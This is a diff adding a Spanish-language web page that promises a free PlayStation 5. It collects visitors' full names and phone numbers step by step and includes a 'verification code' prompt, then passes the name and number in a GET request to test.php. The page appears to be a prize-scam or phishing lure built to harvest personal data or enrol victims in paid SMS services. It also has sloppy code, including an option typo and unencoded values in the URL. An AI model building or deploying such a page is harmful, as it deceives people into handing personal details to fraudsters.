@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content= "width=device-width, user-scalable=no">
+	<meta name="referrer" content="no-referrer">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link href="https://fonts.googleapis.com/css2?family=Rubik&family=Varela+Round&display=swap" rel="stylesheet">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>
+    <script src="https://kit.fontawesome.com/0a7198e186.js" crossorigin="anonymous"></script>
+	<link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+    <link rel="shortcut icon" type="image/jpg" href="img/favicon2.png"/>
+    <link rel="stylesheet" href="css/oferta1.css">
+    <title>Gana Tu Playstation 5 | ⭐⭐⭐⭐⭐</title>
+</head>
+<body>
+    <section class="primera">
+        <div class="lead">
+            <h1>Participa y Gana GRATIS una PS5</h1>
+            <div class="formulario" id="formulario">
+                <div class="question" id="question1">
+                    <label for="" class="pregunta">Nombre Completo</label><br>
+                    <span class="explicacion">Si resultas ganador debe coincidir con tu Nombre Real</span><br><br>
+                    <div class="contestacion">
+                        <input type="text" id="nombre">
+                        <button id="continuar1">Continuar</button>
+                    </div>
+                </div>
+                <div class="question" id="question2">
+                    <label for="" class="pregunta">Teléfono</label><br>
+                    <span class="explicacion">Te enviaremos un Código de Verificación</span><br><br>
+                    <div class="contestacion">
+                        <input type="text" placeholder="Escribe Tu Teléfono" id="telefono">
+                        <button id="continuar2">Enviar Código</button>
+                    </div>
+                </div>
+                <div class="question" id="question3">
+                    <label for="" class="pregunta">Código de Verificación</label><br>
+                    <div class="contestacion">
+                        <input type="text">
+                        <button id="continuar3">Continuar</button>
+                    </div>
+                    <span id="respuesta"></span>
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.18.0/axios.min.js"></script> -->
+    <script src="confetti.min.js"></script>
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    <script>
+  AOS.init({
+  	duraction: 1000,
+  });
+
+  const formulario = document.getElementById('formulario');
+  const question1 = document.getElementById('question1');
+  const question2 = document.getElementById('question2');
+  const question3 = document.getElementById('question3');
+  const continuar1 = document.getElementById('continuar1');
+  const continuar2 = document.getElementById('continuar2');
+  const continuar3 = document.getElementById('continuar3');
+  const nombre = document.getElementById('nombre');
+  const teléfono = document.getElementById('telefono');
+
+  continuar1.addEventListener('click', function(){
+    formulario.style.width = "200%";
+    question1.style.display = "none";
+    const nombreValor = nombre.value;
+    console.log(nombreValor);
+  })
+
+  continuar2.addEventListener('click', function(){
+    formulario.style.width = "100%";
+    question2.style.display = "none";
+    const telefonoValor = telefono.value;
+    const nombreValor = nombre.value;
+    window.location.href = "test.php?nombre="+nombreValor+"&telefono="+telefonoValor; 
+
+  })
+
+  continuar3.addEventListener('click', function(){
+    const nombre = document.getElementById('nombre').value;
+    const telefono = document.getElementById('telefono').value;
+    window.location.href = "test.php?nombre="+nombre+"&telefono="+telefono;
+    // const data = "nombre="+nombre+"&telefono="+telefono;
+    // $.ajax({
+    //         url: 'test.php',
+    //         type: 'GET',
+    //         async: false,
+    //         data: data,
+
+    //         success: function (response) {
+    //             $('#respuesta').html('<span>Verificado</span>');
+    //         }
+
+    //     })
+})
+
+ 
+</script>
+</body>
+</html>
